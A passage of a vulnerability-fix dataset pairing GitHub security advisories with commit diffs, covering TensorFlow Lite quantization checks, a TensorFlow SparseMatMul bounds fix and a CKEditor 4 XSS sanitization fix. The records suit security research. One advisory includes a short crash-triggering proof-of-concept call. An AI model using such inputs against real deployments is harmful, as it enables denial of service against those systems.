Patches\nWe have patched the issue in GitHub commits [537bc7c723439b9194a358f64d871dd326c18887](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/537bc7c723439b9194a358f64d871dd326c18887),\n[4a91f2069f7145aab6ba2d8cfe41be8a110c18a5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5) and [8933b8a21280696ab119b63263babdb54c298538](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8933b8a21280696ab119b63263babdb54c298538).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5","commit_sha":"4a91f2069f7145aab6ba2d8cfe41be8a110c18a5","patch":"MULTI","chain_ord":"['537bc7c723439b9194a358f64d871dd326c18887', '4a91f2069f7145aab6ba2d8cfe41be8a110c18a5', '8933b8a21280696ab119b63263babdb54c298538']","before_first_fix_commit":"{'e35be978351a8578549d30b6f483825d36dc0f8b'}","last_fix_commit":"8933b8a21280696ab119b63263babdb54c298538","chain_ord_pos":2.0,"commit_datetime":"07\/16\/2021, 16:59:39","message":"Fix a null pointer exception caused by branching on uninitialized data.\n\nThis is due to not checking that the params for the quantization exists. If there is no quantization, we should not access the `.params` field.\n\nPiperOrigin-RevId: 385168337\nChange-Id: I28661e4f12ba1c92cfeae23d22a3fb2df2a2c6a4","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'tensorflow\/lite\/kernels\/unidirectional_sequence_lstm.cc': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5\/tensorflow%2Flite%2Fkernels%2Funidirectional_sequence_lstm.cc', 'patch': '@@ -62,8 +62,12 @@ TfLiteStatus PopulateQuantizedLstmParams8x8_16(\\n       context,\\n       GetOutputSafe(context, node, lstm::full::kOutputTensor, &output_tensor));\\n \\n+  TF_LITE_ENSURE(context,\\n+                 cell_state->quantization.type != kTfLiteNoQuantization);\\n   auto* cell_state_params =\\n       static_cast<TfLiteAffineQuantization*>(cell_state->quantization.params);\\n+  TF_LITE_ENSURE(context,\\n+                 output_tensor->quantization.type != kTfLiteNoQuantization);\\n   auto* proj_params = static_cast<TfLiteAffineQuantization*>(\\n       output_tensor->quantization.params);\\n   if (cell_clip > 0.0) {\\n@@ -160,6 +164,8 @@ TfLiteStatus PopulateQuantizedLstmParams8x8_16(\\n       TfLiteTensor* intermediate;\\n       TF_LITE_ENSURE_OK(context,\\n                         GetIntermediatesSafe(context, node, i, &intermediate));\\n+      TF_LITE_ENSURE(context,\\n+                     intermediate->quantization.type != kTfLiteNoQuantization);\\n       auto* params = static_cast<TfLiteAffineQuantization*>(\\n           intermediate->quantization.params);\\n       intermediate_scale.push_back(params->scale->data[0]);\\n@@ -174,6 +180,7 @@ TfLiteStatus PopulateQuantizedLstmParams8x8_16(\\n   \/\/ is ignored.\\n   TfLiteTensor* hidden;\\n   TF_LITE_ENSURE_OK(context, GetIntermediatesSafe(context, node, 4, &hidden));\\n+  TF_LITE_ENSURE(context, hidden->quantization.type != kTfLiteNoQuantization);\\n   auto* hidden_params =\\n       static_cast<TfLiteAffineQuantization*>(hidden->quantization.params);\\n   intermediate_scale.push_back(hidden_params->scale->data[0]);\\n@@ -760,6 +767,8 @@ TfLiteStatus PopulatePrecomputedZPTimesWeightsWithBias(TfLiteContext* context,\\n \\n   const TfLiteTensor* intermediate =\\n       &context->tensors[node->intermediates->data[4]];\\n+  TF_LITE_ENSURE(context,\\n+                 intermediate->quantization.type != kTfLiteNoQuantization);\\n   const auto* params =\\n       static_cast<TfLiteAffineQuantization*>(intermediate->quantization.params);\\n   const int32_t hidden_zp = params->zero_point->data[0];'}}","message_norm":"fix a null pointer exception caused by branching on uninitialized data.\n\nthis is due to not checking that the params for the quantization exists. if there is no quantization, we should not access the `.params` field.\n\npiperorigin-revid: 385168337\nchange-id: i28661e4f12ba1c92cfeae23d22a3fb2df2a2c6a4","language":"en","entities":"[('fix', 'ACTION', ''), ('null pointer exception', 'SECWORD', ''), ('uninitialized', 'SECWORD', ''), ('385168337', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/unidirectional_sequence_lstm.cc'])","num_files":1.0},{"index":401,"vuln_id":"GHSA-4c4g-crqm-xrxw","cwe_id":"{'CWE-908'}","score":4.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8933b8a21280696ab119b63263babdb54c298538', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/537bc7c723439b9194a358f64d871dd326c18887'}","dataset":"osv","summary":"Use of unitialized value in TFLite ### Impact\nAll TFLite operations that use quantization can be made to use unitialized values. [For example](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/lite\/kernels\/depthwise_conv.cc#L198-L200):\n\n```cc\n    const auto* affine_quantization =\n        reinterpret_cast<TfLiteAffineQuantization*>(\n            filter->quantization.params);\n```\n\nThe issue stems from the fact that `quantization.params` is only valid if `quantization.type` is different that `kTfLiteNoQuantization`. However, these checks are missing in large parts of the code.\n\n### Patches\nWe have patched the issue in GitHub commits [537bc7c723439b9194a358f64d871dd326c18887](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/537bc7c723439b9194a358f64d871dd326c18887),\n[4a91f2069f7145aab6ba2d8cfe41be8a110c18a5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5) and [8933b8a21280696ab119b63263babdb54c298538](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8933b8a21280696ab119b63263babdb54c298538).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8933b8a21280696ab119b63263babdb54c298538","commit_sha":"8933b8a21280696ab119b63263babdb54c298538","patch":"MULTI","chain_ord":"['537bc7c723439b9194a358f64d871dd326c18887', '4a91f2069f7145aab6ba2d8cfe41be8a110c18a5', '8933b8a21280696ab119b63263babdb54c298538']","before_first_fix_commit":"{'e35be978351a8578549d30b6f483825d36dc0f8b'}","last_fix_commit":"8933b8a21280696ab119b63263babdb54c298538","chain_ord_pos":3.0,"commit_datetime":"07\/16\/2021, 17:22:37","message":"Fix a null pointer exception caused by branching on uninitialized data.\n\nThis is due to not checking that the params for the quantization exists. If there is no quantization, we should not access the `.params` field.\n\nPiperOrigin-RevId: 385173491\nChange-Id: I8fc476c4b274fdb21ba741caa0fbc6d1b8840663","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/lite\/kernels\/depthwise_conv.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8933b8a21280696ab119b63263babdb54c298538\/tensorflow%2Flite%2Fkernels%2Fdepthwise_conv.cc', 'patch': '@@ -176,6 +176,7 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n   if (data_type != kTfLiteFloat32) {\\n     TF_LITE_ENSURE_EQ(context, filter->quantization.type,\\n                       kTfLiteAffineQuantization);\\n+    TF_LITE_ENSURE(context, filter->quantization.type != kTfLiteNoQuantization);\\n     const auto* affine_quantization =\\n         reinterpret_cast<TfLiteAffineQuantization*>(\\n             filter->quantization.params);\\n@@ -195,6 +196,7 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n   }\\n \\n   if (is_hybrid) {\\n+    TF_LITE_ENSURE(context, filter->quantization.type != kTfLiteNoQuantization);\\n     const auto* affine_quantization =\\n         reinterpret_cast<TfLiteAffineQuantization*>(\\n             filter->quantization.params);\\n@@ -495,6 +497,7 @@ TfLiteStatus EvalHybridPerChannel(TfLiteContext* context, TfLiteNode* node,\\n   op_params.weights_offset = 0;\\n   op_params.float_activation_min = output_activation_min;\\n   op_params.float_activation_max = output_activation_max;\\n+  TF_LITE_ENSURE(context, filter->quantization.type != kTfLiteNoQuantization);\\n   const auto* affine_quantization =\\n       reinterpret_cast<TfLiteAffineQuantization*>(filter->quantization.params);\\n   if (kernel_type == kReference) {'}}","message_norm":"fix a null pointer exception caused by branching on uninitialized data.\n\nthis is due to not checking that the params for the quantization exists. if there is no quantization, we should not access the `.params` field.\n\npiperorigin-revid: 385173491\nchange-id: i8fc476c4b274fdb21ba741caa0fbc6d1b8840663","language":"en","entities":"[('fix', 'ACTION', ''), ('null pointer exception', 'SECWORD', ''), ('uninitialized', 'SECWORD', ''), ('385173491', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/depthwise_conv.cc'])","num_files":1.0},{"index":402,"vuln_id":"GHSA-4c4g-crqm-xrxw","cwe_id":"{'CWE-908'}","score":4.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8933b8a21280696ab119b63263babdb54c298538', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/537bc7c723439b9194a358f64d871dd326c18887'}","dataset":"osv","summary":"Use of unitialized value in TFLite ### Impact\nAll TFLite operations that use quantization can be made to use unitialized values. [For example](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/lite\/kernels\/depthwise_conv.cc#L198-L200):\n\n```cc\n    const auto* affine_quantization =\n        reinterpret_cast<TfLiteAffineQuantization*>(\n            filter->quantization.params);\n```\n\nThe issue stems from the fact that `quantization.params` is only valid if `quantization.type` is different that `kTfLiteNoQuantization`. However, these checks are missing in large parts of the code.\n\n### Patches\nWe have patched the issue in GitHub commits [537bc7c723439b9194a358f64d871dd326c18887](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/537bc7c723439b9194a358f64d871dd326c18887),\n[4a91f2069f7145aab6ba2d8cfe41be8a110c18a5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5) and [8933b8a21280696ab119b63263babdb54c298538](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8933b8a21280696ab119b63263babdb54c298538).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/537bc7c723439b9194a358f64d871dd326c18887","commit_sha":"537bc7c723439b9194a358f64d871dd326c18887","patch":"MULTI","chain_ord":"['537bc7c723439b9194a358f64d871dd326c18887', '4a91f2069f7145aab6ba2d8cfe41be8a110c18a5', '8933b8a21280696ab119b63263babdb54c298538']","before_first_fix_commit":"{'e35be978351a8578549d30b6f483825d36dc0f8b'}","last_fix_commit":"8933b8a21280696ab119b63263babdb54c298538","chain_ord_pos":1.0,"commit_datetime":"07\/16\/2021, 16:35:48","message":"Fix a null pointer exception caused by branching on uninitialized data.\n\nThis is due to not checking that the params for the quantization exists. If there is no quantization, we should not access the `.params` field.\n\nPiperOrigin-RevId: 385163909\nChange-Id: I2beb8d50649b6542db224c163033fbcbaa49314f","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'tensorflow\/lite\/kernels\/svdf.cc': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/537bc7c723439b9194a358f64d871dd326c18887\/tensorflow%2Flite%2Fkernels%2Fsvdf.cc', 'patch': '@@ -256,14 +256,21 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n                                                      output_temp_size_array));\\n \\n     \/\/ Calculate effective scales.\\n+    TF_LITE_ENSURE(context, input->quantization.type != kTfLiteNoQuantization);\\n     auto* input_params =\\n         reinterpret_cast<TfLiteAffineQuantization*>(input->quantization.params);\\n+    TF_LITE_ENSURE(context,\\n+                   weights_feature->quantization.type != kTfLiteNoQuantization);\\n     auto* weights_feature_params = reinterpret_cast<TfLiteAffineQuantization*>(\\n         weights_feature->quantization.params);\\n+    TF_LITE_ENSURE(context, state->quantization.type != kTfLiteNoQuantization);\\n     auto* state_params =\\n         reinterpret_cast<TfLiteAffineQuantization*>(state->quantization.params);\\n+    TF_LITE_ENSURE(context,\\n+                   weights_time->quantization.type != kTfLiteNoQuantization);\\n     auto* weight_time_params = reinterpret_cast<TfLiteAffineQuantization*>(\\n         weights_time->quantization.params);\\n+    TF_LITE_ENSURE(context, output->quantization.type != kTfLiteNoQuantization);\\n     auto* output_params = reinterpret_cast<TfLiteAffineQuantization*>(\\n         output->quantization.params);\\n     const double effective_scale_1 = input_params->scale->data[0] *'}}","message_norm":"fix a null pointer exception caused by branching on uninitialized data.\n\nthis is due to not checking that the params for the quantization exists. if there is no quantization, we should not access the `.params` field.\n\npiperorigin-revid: 385163909\nchange-id: i2beb8d50649b6542db224c163033fbcbaa49314f","language":"en","entities":"[('fix', 'ACTION', ''), ('null pointer exception', 'SECWORD', ''), ('uninitialized', 'SECWORD', ''), ('385163909', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/svdf.cc'])","num_files":1.0},{"index":411,"vuln_id":"GHSA-4f99-p9c2-3j8x","cwe_id":"{'CWE-125', 'CWE-824'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae'}","dataset":"osv","summary":"Undefined behavior via `nullptr` reference binding in sparse matrix multiplication ### Impact\nThe [code for sparse matrix multiplication](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/sparse_matmul_op.cc#L954-L1086) is vulnerable to undefined behavior via binding a reference to `nullptr`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.SparseMatMul(\n  a=[[1.0,1.0,1.0]],\n  b=[[],[],[]],\n  transpose_a=False,\n  transpose_b=False,\n  a_is_sparse=False, \n  b_is_sparse=True)\n```\n\nThis occurs whenever the dimensions of `a` or `b` are 0 or less. In the case on one of these is 0, an empty output tensor should be allocated (to conserve the invariant that output tensors are always allocated when the operation is successful) but nothing should be written to it (that is, we should return early from the kernel implementation). Otherwise, attempts to write to this empty tensor would result in heap OOB access.\n\n### Patches\nWe have patched the issue in GitHub commit [e6cf28c72ba2eb949ca950d834dd6d66bb01cfae](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae","commit_sha":"e6cf28c72ba2eb949ca950d834dd6d66bb01cfae","patch":"SINGLE","chain_ord":"['e6cf28c72ba2eb949ca950d834dd6d66bb01cfae']","before_first_fix_commit":"{'d4fdd7830befb1f3aed8b4d1681471531856ae77'}","last_fix_commit":"e6cf28c72ba2eb949ca950d834dd6d66bb01cfae","chain_ord_pos":1.0,"commit_datetime":"10\/06\/2021, 04:54:15","message":"Validate that matrix dimension sizes in SparseMatMul are positive.\n\nPiperOrigin-RevId: 401149683\nChange-Id: Ib33eafc561a39c8741ece80b2edce6d4aae9a57d","author":"Penporn Koanantakool","comments":null,"stats":"{'additions': 10, 'deletions': 0, 'total': 10}","files":"{'tensorflow\/core\/kernels\/sparse_matmul_op.cc': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae\/tensorflow%2Fcore%2Fkernels%2Fsparse_matmul_op.cc', 'patch': '@@ -32,6 +32,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/kernels\/fill_functor.h\"\\n #include \"tensorflow\/core\/lib\/core\/blocking_counter.h\"\\n #include \"tensorflow\/core\/lib\/core\/threadpool.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #include \"tensorflow\/core\/platform\/logging.h\"\\n #include \"tensorflow\/core\/platform\/macros.h\"\\n #include \"tensorflow\/core\/platform\/mutex.h\"\\n@@ -980,9 +981,18 @@ class SparseMatMulOp : public OpKernel {\\n                 errors::InvalidArgument(\\n                     \"Matrix size incompatible: a: \", a.shape().DebugString(),\\n                     \", b: \", b.shape().DebugString()));\\n+    OP_REQUIRES(ctx, m >= 0 && n >= 0 && k >= 0,\\n+                errors::InvalidArgument(\\n+                    \"Matrix dimensions cannot be negative: a: \",\\n+                    a.shape().DebugString(), \", b: \", b.shape().DebugString()));\\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(ctx, ctx->allocate_output(0, TensorShape({m, n}), &output));\\n \\n+    \/\/ Return early if at least one of the output dimension size is 0.\\n+    if (m == 0 || n == 0) {\\n+      return;\\n+    }\\n+\\n     if (k == 0) {\\n       \/\/ If the inner dimension k in the matrix multiplication is zero, we fill\\n       \/\/ the output with zeros.'}}","message_norm":"validate that matrix dimension sizes in sparsematmul are positive.\n\npiperorigin-revid: 401149683\nchange-id: ib33eafc561a39c8741ece80b2edce6d4aae9a57d","language":"en","entities":"[('validate', 'ACTION', ''), ('401149683', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_matmul_op.cc'])","num_files":1.0},{"index":412,"vuln_id":"GHSA-4fc4-4p5g-6w89","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/ckeditor\/ckeditor4\/commit\/d158413449692d920a778503502dcb22881bc949'}","dataset":"osv","summary":"Cross-site Scripting in CKEditor4 ### Affected packages\nThe vulnerability has been discovered in the core HTML processing module and may affect all plugins used by CKEditor 4.\n\n### Impact\nA potential vulnerability has been discovered in CKEditor 4 HTML processing core module. The vulnerability allowed to inject malformed HTML bypassing content sanitization, which could result in executing JavaScript code. It affects all users using the CKEditor 4 at version < 4.18.0.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version 4.18.0.\n\n### For more information\nEmail us at security@cksource.com if you have any questions or comments about this advisory.\n\n### Acknowledgements\nThe CKEditor 4 team would like to thank GHSL team member Kevin Backhouse ([@kevinbackhouse](https:\/\/github.com\/kevinbackhouse)) for recognizing and reporting this vulnerability.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/ckeditor\/ckeditor4","commit_href":"https:\/\/github.com\/ckeditor\/ckeditor4\/commit\/d158413449692d920a778503502dcb22881bc949","commit_sha":"d158413449692d920a778503502dcb22881bc949","patch":"SINGLE","chain_ord":"['d158413449692d920a778503502dcb22881bc949']","before_first_fix_commit":"{'8cff1e5aee3d766068792a374ba6b54a5cb92e2d'}","last_fix_commit":"d158413449692d920a778503502dcb22881bc949","chain_ord_pos":1.0,"commit_datetime":"02\/08\/2022, 16:35:34","message":"Code refactoring.","author":"Tomasz Jakut","comments":null,"stats":"{'additions': 26, 'deletions': 14, 'total': 40}","files":"{'core\/htmldataprocessor.js': {'additions': 26, 'deletions': 14, 'changes': 40, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ckeditor\/ckeditor4\/raw\/d158413449692d920a778503502dcb22881bc949\/core%2Fhtmldataprocessor.js', 'patch': '@@ -50,17 +50,18 @@\\n \\t\\thtmlFilter.addRules( createBogusAndFillerRules( editor, \\'html\\' ), { applyToAll: true } );\\n \\n \\t\\teditor.on( \\'toHtml\\', function( evt ) {\\n-\\t\\t\\tvar evtData = evt.data,\\n+\\t\\t\\tvar randomNumber = generateRandomNumber(),\\n+\\t\\t\\t\\tevtData = evt.data,\\n \\t\\t\\t\\tdata = evtData.dataValue,\\n \\t\\t\\t\\tfixBodyTag;\\n \\n \\t\\t\\t\/\/ Before we start protecting markup, make sure there are no externally injected\\n \\t\\t\\t\/\/ protection keywords.\\n-\\t\\t\\tdata = removeReservedKeywords( data );\\n+\\t\\t\\tdata = removeReservedKeywords( data, randomNumber );\\n \\n \\t\\t\\t\/\/ The source data is already HTML, but we need to clean\\n \\t\\t\\t\/\/ it up and apply the filter.\\n-\\t\\t\\tdata = protectSource( data, editor );\\n+\\t\\t\\tdata = protectSource( data, editor, randomNumber );\\n \\n \\t\\t\\t\/\/ Protect content of textareas. (https:\/\/dev.ckeditor.com\/ticket\/9995)\\n \\t\\t\\t\/\/ Do this before protecting attributes to avoid breaking:\\n@@ -70,7 +71,7 @@\\n \\t\\t\\t\/\/ Before anything, we must protect the URL attributes as the\\n \\t\\t\\t\/\/ browser may changing them when setting the innerHTML later in\\n \\t\\t\\t\/\/ the code.\\n-\\t\\t\\tdata = protectAttributes( data );\\n+\\t\\t\\tdata = protectAttributes( data, randomNumber );\\n \\n \\t\\t\\t\/\/ Protect elements than can\\'t be set inside a DIV. E.g. IE removes\\n \\t\\t\\t\/\/ style tags from innerHTML. (https:\/\/dev.ckeditor.com\/ticket\/3710)\\n@@ -90,7 +91,7 @@\\n \\n \\t\\t\\t\/\/ There are attributes which may execute JavaScript code inside fixBin.\\n \\t\\t\\t\/\/ Encode them greedily. They will be unprotected right after getting HTML from fixBin. (https:\/\/dev.ckeditor.com\/ticket\/10)\\n-\\t\\t\\tdata = protectInsecureAttributes( data );\\n+\\t\\t\\tdata = protectInsecureAttributes( data, randomNumber );\\n \\n \\t\\t\\tvar fixBin = evtData.context || editor.editable().getName(),\\n \\t\\t\\t\\tisPre;\\n@@ -110,7 +111,7 @@\\n \\t\\t\\tdata = el.getHtml().substr( 1 );\\n \\n \\t\\t\\t\/\/ Restore shortly protected attribute names.\\n-\\t\\t\\tdata = data.replace( new RegExp( \\'data-cke-\\' + CKEDITOR.rnd + \\'-\\', \\'ig\\' ), \\'\\' );\\n+\\t\\t\\tdata = data.replace( new RegExp( \\'data-cke-\\' + randomNumber + \\'-\\', \\'ig\\' ), \\'\\' );\\n \\n \\t\\t\\tisPre && ( data = data.replace( \/^<pre>|<\\\\\/pre>$\/gi, \\'\\' ) );\\n \\n@@ -838,13 +839,13 @@\\n \\n \\tvar protectSelfClosingRegex = \/<cke:(param|embed)([^>]*?)\\\\\/?>(?!\\\\s*<\\\\\/cke:\\\\1)\/gi;\\n \\n-\\tfunction protectAttributes( html ) {\\n+\\tfunction protectAttributes( html, randomNumber ) {\\n \\t\\treturn html.replace( protectElementRegex, function( element, tag, attributes ) {\\n \\t\\t\\treturn \\'<\\' + tag + attributes.replace( protectAttributeRegex, function( fullAttr, attrName ) {\\n \\t\\t\\t\\t\/\/ Avoid corrupting the inline event attributes (https:\/\/dev.ckeditor.com\/ticket\/7243).\\n \\t\\t\\t\\t\/\/ We should not rewrite the existed protected attributes, e.g. clipboard content from editor. (https:\/\/dev.ckeditor.com\/ticket\/5218)\\n \\t\\t\\t\\tif ( protectAttributeNameRegex.test( attrName ) && attributes.indexOf( \\'data-cke-saved-\\' + attrName ) == -1 )\\n-\\t\\t\\t\\t\\treturn \\' data-cke-saved-\\' + fullAttr + \\' data-cke-\\' + CKEDITOR.rnd + \\'-\\' + fullAttr;\\n+\\t\\t\\t\\t\\treturn \\' data-cke-saved-\\' + fullAttr + \\' data-cke-\\' + randomNumber + \\'-\\' + fullAttr;\\n \\n \\t\\t\\t\\treturn fullAttr;\\n \\t\\t\\t} ) + \\'>\\';\\n@@ -897,8 +898,8 @@\\n \\t\/\/ * opening tags - e.g. `<onfoo`,\\n \\t\/\/ * closing tags - e.g. <\/onfoo> (tested in \"false positive 1\"),\\n \\t\/\/ * part of other attribute - e.g. `data-onfoo` or `fonfoo`.\\n-\\tfunction protectInsecureAttributes( html ) {\\n-\\t\\treturn html.replace( \/([^a-z0-9<\\\\-])(on\\\\w{3,})(?!>)\/gi, \\'$1data-cke-\\' + CKEDITOR.rnd + \\'-$2\\' );\\n+\\tfunction protectInsecureAttributes( html, randomNumber ) {\\n+\\t\\treturn html.replace( \/([^a-z0-9<\\\\-])(on\\\\w{3,})(?!>)\/gi, \\'$1data-cke-\\' + randomNumber + \\'-$2\\' );\\n \\t}\\n \\n \\tfunction unprotectRealComments( html ) {\\n@@ -917,11 +918,11 @@\\n \\t\\t} );\\n \\t}\\n \\n-\\tfunction protectSource( data, editor ) {\\n+\\tfunction protectSource( data, editor, randomNumber ) {\\n \\t\\tvar protectedHtml = [],\\n \\t\\t\\tprotectRegexes = editor.config.protectedSource,\\n \\t\\t\\tstore = editor._.dataStore || ( editor._.dataStore = { id: 1 } ),\\n-\\t\\t\\ttempRegex = \/<\\\\!--\\\\{cke_temp(comment)?\\\\}(\\\\d*?)-->\/g;\\n+\\t\\t\\ttempRegex = new RegExp(\\'<\\\\\\\\!--\\\\\\\\{cke_temp_\\' + randomNumber + \\'(comment)?\\\\\\\\}(\\\\\\\\d*?)-->\\', \\'g\\' );\\n \\n \\t\\tvar regexes = [\\n \\t\\t\\t\/\/ Script tags will also be forced to be protected, otherwise\\n@@ -940,7 +941,7 @@\\n \\t\\t\/\/ Note that we use a different tag for comments, as we need to\\n \\t\\t\/\/ transform them when applying filters.\\n \\t\\tdata = data.replace( ( \/<!--[\\\\s\\\\S]*?-->\/g ), function( match ) {\\n-\\t\\t\\treturn \\'<!--{cke_tempcomment}\\' + ( protectedHtml.push( match ) - 1 ) + \\'-->\\';\\n+\\t\\t\\treturn \\'<!--{cke_temp_\\' + randomNumber + \\'comment}\\' + ( protectedHtml.push( match ) - 1 ) + \\'-->\\';\\n \\t\\t} );\\n \\n \\t\\tfor ( var i = 0; i < regexes.length; i++ ) {\\n@@ -951,7 +952,8 @@\\n \\t\\t\\t\\t} );\\n \\n \\t\\t\\t\\t\/\/ Avoid protecting over protected, e.g. \/\\\\{.*?\\\\}\/\\n-\\t\\t\\t\\treturn ( \/cke_temp(comment)?\/ ).test( match ) ? match : \\'<!--{cke_temp}\\' + ( protectedHtml.push( match ) - 1 ) + \\'-->\\';\\n+\\t\\t\\t\\treturn ( tempRegex ).test( match ) ? match : \\'<!--{cke_temp_\\' + randomNumber + \\'}\\' +\\n+\\t\\t\\t\\t\\t( protectedHtml.push( match ) - 1 ) + \\'-->\\';\\n \\t\\t\\t} );\\n \\t\\t}\\n \\t\\tdata = data.replace( tempRegex, function( $, isComment, id ) {\\n@@ -1107,6 +1109,16 @@\\n \\t\\t\\t};\\n \\t\\t}\\n \\t} )();\\n+\\n+\\tfunction generateRandomNumber() {\\n+\\t\\tvar cryptoApi = window.crypto || window.msCrypto;\\n+\\n+\\t\\tif ( cryptoApi ) {\\n+\\t\\t\\treturn cryptoApi.getRandomValues( new Uint32Array( 1 ) )[ 0 ];\\n+\\t\\t}\\n+\\n+\\t\\treturn Math.floor( Math.random() *  9000000000 + 1000000000 );\\n+\\t}\\n } )();\\n \\n \/**'}}","message_norm":"code refactoring.","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/htmldataprocessor.js'])","num_files":1.0},{"index":415,"vuln_id":"GHSA-4fg4-p75j-w5xj","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b'}","dataset":"osv","summary":"Heap out of bounds in `QuantizedBatchNormWithGlobalNormalization` ### Impact\nAn attacker can cause a segfault and denial of service via accessing data outside of bounds in 